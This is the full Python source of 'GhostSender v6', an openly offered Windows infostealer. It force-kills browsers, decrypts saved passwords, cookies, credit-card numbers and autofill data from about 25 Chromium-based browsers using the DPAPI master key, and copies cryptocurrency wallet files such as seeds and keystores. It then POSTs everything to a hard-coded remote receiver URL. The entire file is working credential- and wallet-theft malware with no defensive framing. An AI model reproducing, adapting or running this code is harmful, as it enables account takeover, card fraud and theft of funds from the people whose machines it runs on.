#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
GhostSender v6 — Chromium data extraction & exfiltration client.
Based on GhostExtractor engine for maximum reliability.
"""

import os
import sys
import json
import base64
import sqlite3
import shutil
import hashlib
import platform
import subprocess
import urllib.request
import urllib.error
import ctypes
from ctypes import wintypes
from datetime import datetime
import time

# ─── Configuration ─────────────────────────────────────────────────
RECEIVER_URL = "https://cookies1-lcz0.onrender.com/api/ingest"

# ─── Windows DPAPI via win32crypt (more reliable than raw ctypes) ──
try:
    from win32crypt import CryptUnprotectData
except ImportError:
    print("[*] Installing pywin32...")
    subprocess.check_call(
        [sys.executable, "-m", "pip", "install", "pywin32", "--quiet", "--no-warn-script-location"],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )
    from win32crypt import CryptUnprotectData

# ─── Crypto ────────────────────────────────────────────────────────
try:
    from Crypto.Cipher import AES
except ImportError:
    print("[*] Installing pycryptodome...")
    subprocess.check_call(
        [sys.executable, "-m", "pip", "install", "pycryptodome", "--quiet", "--no-warn-script-location"],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )
    from Crypto.Cipher import AES

# ─── Environment ───────────────────────────────────────────────────
LOCAL = os.getenv("LOCALAPPDATA", "")
ROAMING = os.getenv("APPDATA", "")
TEMP = os.getenv("TEMP", os.getcwd())
USERNAME = os.getlogin()
HOSTNAME = platform.node()

def get_machine_id() -> str:
    key = f"{HOSTNAME}-{USERNAME}-{LOCAL}"
    return hashlib.sha256(key.encode()).hexdigest()[:32]

MACHINE_ID = get_machine_id()

# ─── Browser Discovery ─────────────────────────────────────────────
CHROMIUM_BROWSERS = {
    "chrome": ("local", "Google\\Chrome\\User Data"),
    "edge": ("local", "Microsoft\\Edge\\User Data"),
    "brave": ("local", "BraveSoftware\\Brave-Browser\\User Data"),
    "opera": ("roaming", "Opera Software\\Opera Stable"),
    "opera-gx": ("roaming", "Opera Software\\Opera GX Stable"),
    "vivaldi": ("local", "Vivaldi\\User Data"),
    "yandex": ("local", "Yandex\\YandexBrowser\\User Data"),
    "chromium": ("local", "Chromium\\User Data"),
    "iridium": ("local", "Iridium\\User Data"),
    "coccoc": ("local", "CocCoc\\Browser\\User Data"),
    "whale": ("local", "Naver\\Naver Whale\\User Data"),
    "avast": ("local", "AVAST Software\\Browser\\User Data"),
    "avg": ("local", "AVG\\Browser\\User Data"),
    "ccleaner": ("local", "CCleaner\\CCleaner Browser\\User Data"),
    "epic": ("local", "Epic Privacy Browser\\User Data"),
    "torch": ("local", "Torch\\User Data"),
    "cent": ("local", "CentBrowser\\User Data"),
    "7star": ("local", "7Star\\7Star\\User Data"),
    "sputnik": ("local", "Sputnik\\Sputnik\\User Data"),
    "superbird": ("local", "Superbird\\User Data"),
    "dragon": ("local", "Comodo\\Dragon\\User Data"),
    "slimjet": ("local", "Slimjet\\User Data"),
    "amigo": ("local", "Amigo\\User Data"),
    "kometa": ("local", "Kometa\\User Data"),
    "orbitum": ("local", "Orbitum\\User Data"),
}

def discover_browsers():
    found = {}
    for name, (scope, rel) in CHROMIUM_BROWSERS.items():
        root = LOCAL if scope == "local" else ROAMING
        full = os.path.join(root, rel)
        ls = os.path.join(full, "Local State")
        if os.path.exists(ls):
            found[name] = full
    return found

# ─── Master Key Extraction ───────────────────────────────────────
def get_master_key(local_state_path: str) -> bytes:
    with open(local_state_path, "r", encoding="utf-8") as f:
        data = json.load(f)
    enc_key = base64.b64decode(data["os_crypt"]["encrypted_key"])
    return CryptUnprotectData(enc_key[5:], None, None, None, 0)[1]

# ─── Cookie/Password Decryption ────────────────────────────────────
def decrypt_value(encrypted: bytes, master_key: bytes) -> str:
    if not encrypted:
        return ""

    # v10 / v11 — AES-256-GCM
    if encrypted[:3] in (b"v10", b"v11"):
        try:
            iv = encrypted[3:15]
            ct = encrypted[15:-16]
            tag = encrypted[-16:]
            cipher = AES.new(master_key, AES.MODE_GCM, nonce=iv)
            plain = cipher.decrypt_and_verify(ct, tag)
            return plain.decode("utf-8", errors="ignore").strip("\x00")
        except Exception:
            pass

    # Raw DPAPI fallback
    try:
        return CryptUnprotectData(encrypted, None, None, None, 0)[1].decode("utf-8", errors="ignore").strip("\x00")
    except Exception:
        return ""

# ─── Database Helpers (GhostExtractor style) ───────────────────────
def temp_copy(src: str) -> str:
    dst = os.path.join(TEMP, f"ghost_{os.path.basename(src)}_{os.urandom(4).hex()}")
    try:
        shutil.copy2(src, dst)
        time.sleep(0.1)
        return dst
    except Exception as e:
        print(f"    [!] Copy failed: {e}")
        return None

def cleanup(path: str):
    for ext in ("", "-wal", "-journal", "-shm"):
        try:
            p = path + ext
            if os.path.exists(p):
                os.remove(p)
        except:
            pass

def query_db(path: str, sql: str):
    if not path or not os.path.exists(path):
        return []
    for attempt in range(4):
        tmp = temp_copy(path)
        if not tmp:
            time.sleep(0.25 * (attempt + 1))
            continue
        conn = None
        try:
            conn = sqlite3.connect(tmp, timeout=5)
            return conn.execute(sql).fetchall()
        except sqlite3.OperationalError:
            if attempt < 3:
                time.sleep(0.25 * (attempt + 1))
        except Exception as e:
            print(f"    [!] Query error: {e}")
            break
        finally:
            if conn:
                try:
                    conn.close()
                except:
                    pass
            cleanup(tmp)
    return []

# ─── Profile Discovery ─────────────────────────────────────────────
def discover_profiles(base_path: str):
    profiles = []
    try:
        for entry in os.scandir(base_path):
            if not entry.is_dir():
                continue
            name = entry.name
            if name in ("Default", "Guest Profile", "System Profile"):
                profiles.append(name)
            elif name.startswith("Profile "):
                profiles.append(name)
            elif os.path.exists(os.path.join(entry.path, "Cookies")) or \
                 os.path.exists(os.path.join(entry.path, "Network", "Cookies")):
                profiles.append(name)
    except Exception:
        pass
    return profiles if profiles else ["Default"]

def find_cookie_db(profile_path: str) -> str:
    for p in [os.path.join(profile_path, "Network", "Cookies"), os.path.join(profile_path, "Cookies")]:
        if os.path.exists(p):
            return p
    return None

def find_login_db(profile_path: str) -> str:
    for p in [os.path.join(profile_path, "Login Data"), os.path.join(profile_path, "Network", "Login Data")]:
        if os.path.exists(p):
            return p
    return None

def find_web_data(profile_path: str) -> str:
    p = os.path.join(profile_path, "Web Data")
    return p if os.path.exists(p) else None

def find_history_db(profile_path: str) -> str:
    p = os.path.join(profile_path, "History")
    return p if os.path.exists(p) else None

def find_bookmarks(profile_path: str) -> str:
    p = os.path.join(profile_path, "Bookmarks")
    return p if os.path.exists(p) else None

# ─── Data Extraction ───────────────────────────────────────────────
def extract_cookies(cookie_db: str, master_key: bytes):
    rows = query_db(cookie_db, """
        SELECT host_key, name, encrypted_value, path, expires_utc, is_secure, is_httponly, samesite
        FROM cookies
    """)
    cookies = []
    for row in rows:
        host, name, enc_val, path, expires, secure, httponly, samesite = row
        if not enc_val:
            continue
        value = decrypt_value(enc_val, master_key)
        if not value:
            continue

        expires_unix = 0
        if expires:
            expires_unix = max(0, (expires // 1000000) - 11644473600)

        ss_map = {0: "no_restriction", 1: "lax", 2: "strict"}
        ss = ss_map.get(samesite, "unspecified")

        cookies.append({
            "host": host,
            "name": name,
            "value": value,
            "path": path or "/",
            "secure": bool(secure),
            "httpOnly": bool(httponly),
            "expires": expires_unix if expires_unix > 0 else int(datetime.now().timestamp()) + 31536000,
            "sameSite": ss,
        })
    return cookies

def extract_passwords(login_db: str, master_key: bytes):
    rows = query_db(login_db, """
        SELECT origin_url, username_value, password_value
        FROM logins
        WHERE LENGTH(password_value) > 0
    """)
    passwords = []
    for url, username, enc_pw in rows:
        if not enc_pw or not username:
            continue
        pw = decrypt_value(enc_pw, master_key)
        if pw:
            passwords.append({"url": url, "username": username, "password": pw})
    return passwords

def extract_credit_cards(web_data: str, master_key: bytes):
    rows = query_db(web_data, """
        SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, origin
        FROM credit_cards
    """)
    cards = []
    for name, month, year, enc_num, origin in rows:
        number = ""
        if enc_num:
            number = decrypt_value(enc_num, master_key)
        if number or name:
            cards.append({
                "name": name or "",
                "number": number,
                "month": month or 0,
                "year": year or 0,
                "origin": origin or "",
            })
    return cards

def extract_history(history_db: str, limit: int = 2000):
    rows = query_db(history_db, f"""
        SELECT url, title, visit_count, last_visit_time
        FROM urls
        ORDER BY last_visit_time DESC
        LIMIT {limit}
    """)
    history = []
    for url, title, visits, last_visit in rows:
        ts = 0
        if last_visit:
            ts = max(0, (last_visit // 1000000) - 11644473600)
        history.append({"url": url or "", "title": title or "", "visits": visits or 0, "last_visit": ts})
    return history

def extract_autofill(web_data: str):
    rows = query_db(web_data, """
        SELECT name, value, count, date_last_used
        FROM autofill
        WHERE value != ''
        ORDER BY count DESC
        LIMIT 500
    """)
    return [{"field": r[0], "value": r[1], "count": r[2]} for r in rows if r[0] and r[1]]

def walk_bookmarks(node: dict, results: list, folder: str = ""):
    if isinstance(node, dict):
        if node.get("type") == "url":
            results.append({
                "name": node.get("name", ""),
                "url": node.get("url", ""),
                "folder": folder,
            })
        for child in node.get("children", []):
            walk_bookmarks(child, results, node.get("name", folder))
        for key, val in node.items():
            if isinstance(val, dict) and key not in ("meta_info", "sync_metadata"):
                walk_bookmarks(val, results, key)

def extract_bookmarks(bookmarks_path: str):
    try:
        with open(bookmarks_path, "r", encoding="utf-8") as f:
            data = json.load(f)
        bookmarks = []
        walk_bookmarks(data.get("roots", {}), bookmarks)
        return bookmarks
    except Exception:
        return []

# ─── Desktop Wallets ───────────────────────────────────────────────
def extract_desktop_wallets():
    wallets = {}
    wallet_configs = {
        "exodus": {
            "paths": [os.path.join(ROAMING, "Exodus", "exodus.wallet")],
            "files": ["seed.seco", "passphrase.json", "info.seco"],
        },
        "atomic": {
            "paths": [os.path.join(ROAMING, "atomic", "Local Storage", "leveldb")],
            "files": ["*"],
        },
        "electrum": {
            "paths": [os.path.join(ROAMING, "Electrum", "wallets")],
            "files": ["*"],
        },
        "bitcoin-core": {
            "paths": [os.path.join(ROAMING, "Bitcoin", "wallets"), os.path.join(ROAMING, "Bitcoin")],
            "files": ["wallet.dat", "*.dat"],
        },
        "ethereum": {
            "paths": [os.path.join(ROAMING, "Ethereum", "keystore")],
            "files": ["*"],
        },
        "monero": {
            "paths": [os.path.join(ROAMING, "bitmonero")],
            "files": ["*.keys", "*.address.txt"],
        },
        "guarda": {
            "paths": [os.path.join(ROAMING, "Guarda", "Local Storage", "leveldb")],
            "files": ["*"],
        },
        "binance": {
            "paths": [os.path.join(ROAMING, "Binance")],
            "files": ["app-store.json", "simple-storage.json", ".finger-print.fp"],
        },
        "ledger-live": {
            "paths": [os.path.join(ROAMING, "Ledger Live")],
            "files": ["app.json"],
        },
    }

    MAX_SIZE = 10 * 1024 * 1024

    for name, cfg in wallet_configs.items():
        wallet_files = {}
        for wdir in cfg["paths"]:
            if not os.path.isdir(wdir):
                continue
            try:
                for fname in os.listdir(wdir):
                    fpath = os.path.join(wdir, fname)
                    if not os.path.isfile(fpath):
                        continue
                    matched = False
                    for pat in cfg["files"]:
                        if pat == "*" or fname == pat or (pat.startswith("*") and fname.endswith(pat[1:])):
                            matched = True
                            break
                    if not matched:
                        continue
                    try:
                        size = os.path.getsize(fpath)
                        if size > MAX_SIZE or size == 0:
                            continue
                        with open(fpath, "rb") as f:
                            content = f.read()
                        wallet_files[fname] = {
                            "size": size,
                            "content_b64": base64.b64encode(content).decode("ascii"),
                        }
                    except:
                        pass
            except:
                pass
        if wallet_files:
            wallets[name] = {"files": wallet_files}

    return wallets

# ─── Process Killer ────────────────────────────────────────────────
def kill_browsers():
    targets = [
        "chrome.exe", "msedge.exe", "brave.exe", "opera.exe", "vivaldi.exe",
        "chromium.exe", "iridium.exe", "browser.exe",
    ]
    for proc in targets:
        try:
            os.system(f"taskkill /F /IM {proc} >nul 2>&1")
        except:
            pass
    time.sleep(1.5)

# ─── Send to Receiver ──────────────────────────────────────────────
def send_to_receiver(payload: dict):
    data = json.dumps(payload).encode("utf-8")
    req = urllib.request.Request(
        RECEIVER_URL,
        data=data,
        headers={"Content-Type": "application/json"},
        method="POST",
    )
    try:
        with urllib.request.urlopen(req, timeout=60) as resp:
            return json.loads(resp.read().decode())
    except urllib.error.HTTPError as e:
        print(f"[!] HTTP {e.code}: {e.read().decode()}")
        return None
    except Exception as e:
        print(f"[!] Send failed: {e}")
        return None

# ─── Main Extraction ─────────────────────────────────────────────
def extract_all():
    print("[+] GhostSender v6 starting...")
    print(f"[+] Machine ID: {MACHINE_ID}")

    kill_browsers()

    browsers = discover_browsers()
    if not browsers:
        print("[!] No Chromium browsers found")
        return None

    print(f"[+] Found {len(browsers)} browser(s): {', '.join(browsers.keys())}")

    profiles_data = []

    for browser_name, base_path in browsers.items():
        print(f"\n[*] Processing {browser_name}...")
        ls_path = os.path.join(base_path, "Local State")

        try:
            master_key = get_master_key(ls_path)
            print(f"  [+] Master key extracted")
        except Exception as e:
            print(f"  [!] Master key failed: {e}")
            continue

        profiles = discover_profiles(base_path)
        print(f"  [+] Found {len(profiles)} profile(s)")

        for profile in profiles:
            profile_path = os.path.join(base_path, profile)
            print(f"    [*] Profile: {profile}")

            profile_info = {
                "browser_name": browser_name,
                "profile_name": profile,
                "profile_path": profile_path,
                "cookies": [],
                "passwords": [],
                "credit_cards": [],
                "history": [],
                "bookmarks": [],
                "autofill": [],
            }

            # Cookies
            cookie_db = find_cookie_db(profile_path)
            if cookie_db:
                try:
                    profile_info["cookies"] = extract_cookies(cookie_db, master_key)
                    print(f"      [+] {len(profile_info['cookies'])} cookies")
                except Exception as e:
                    print(f"      [!] Cookies failed: {e}")
            else:
                print(f"      [!] No cookie DB found")

            # Passwords
            login_db = find_login_db(profile_path)
            if login_db:
                try:
                    profile_info["passwords"] = extract_passwords(login_db, master_key)
                    print(f"      [+] {len(profile_info['passwords'])} passwords")
                except Exception as e:
                    print(f"      [!] Passwords failed: {e}")
            else:
                print(f"      [!] No login DB found")

            # Credit Cards
            web_data = find_web_data(profile_path)
            if web_data:
                try:
                    profile_info["credit_cards"] = extract_credit_cards(web_data, master_key)
                    print(f"      [+] {len(profile_info['credit_cards'])} cards")
                except Exception as e:
                    print(f"      [!] Cards failed: {e}")

                try:
                    profile_info["autofill"] = extract_autofill(web_data)
                    print(f"      [+] {len(profile_info['autofill'])} autofill entries")
                except Exception as e:
                    print(f"      [!] Autofill failed: {e}")
            else:
                print(f"      [!] No Web Data DB found")

            # History
            hist_db = find_history_db(profile_path)
            if hist_db:
                try:
                    profile_info["history"] = extract_history(hist_db)
                    print(f"      [+] {len(profile_info['history'])} history entries")
                except Exception as e:
                    print(f"      [!] History failed: {e}")
            else:
                print(f"      [!] No History DB found")

            # Bookmarks
            bm_path = find_bookmarks(profile_path)
            if bm_path:
                try:
                    profile_info["bookmarks"] = extract_bookmarks(bm_path)
                    print(f"      [+] {len(profile_info['bookmarks'])} bookmarks")
                except Exception as e:
                    print(f"      [!] Bookmarks failed: {e}")
            else:
                print(f"      [!] No Bookmarks file found")

            profiles_data.append(profile_info)

    # Desktop wallets
    print("\n[*] Scanning desktop wallets...")
    desktop_wallets = extract_desktop_wallets()
    if desktop_wallets:
        print(f"  [+] Found {len(desktop_wallets)} wallet(s)")

    # Build payload
    payload = {
        "machine_id": MACHINE_ID,
        "hostname": HOSTNAME,
        "username": USERNAME,
        "os_info": f"{platform.system()} {platform.release()}",
        "ip": "",
        "user_agent": None,
        "profiles": profiles_data,
        "desktop_wallets": desktop_wallets,
    }

    return payload

# ─── Entry Point ───────────────────────────────────────────────────
def main():
    if os.name != "nt":
        print("[!] This tool requires Windows")
        sys.exit(1)

    if RECEIVER_URL == "http://YOUR_RECEIVER_IP:3000/api/ingest":
        print("[!] Please set RECEIVER_URL in the script before running")
        sys.exit(1)

    payload = extract_all()
    if not payload:
        print("[!] Nothing to send")
        sys.exit(1)

    total_cookies = sum(len(p["cookies"]) for p in payload["profiles"])
    total_passwords = sum(len(p["passwords"]) for p in payload["profiles"])
    total_cards = sum(len(p["credit_cards"]) for p in payload["profiles"])

    print(f"\n[+] Summary:")
    print(f"    Cookies:   {total_cookies}")
    print(f"    Passwords: {total_passwords}")
    print(f"    Cards:     {total_cards}")
    print(f"    Wallets:   {len(payload['desktop_wallets'])}")

    print(f"\n[*] Sending to receiver...")
    result = send_to_receiver(payload)
    if result and result.get("success"):
        print(f"[+] Synced successfully! Target ID: {result.get('target_id')}")
    else:
        print("[!] Sync failed")

if __name__ == "__main__":
    main()
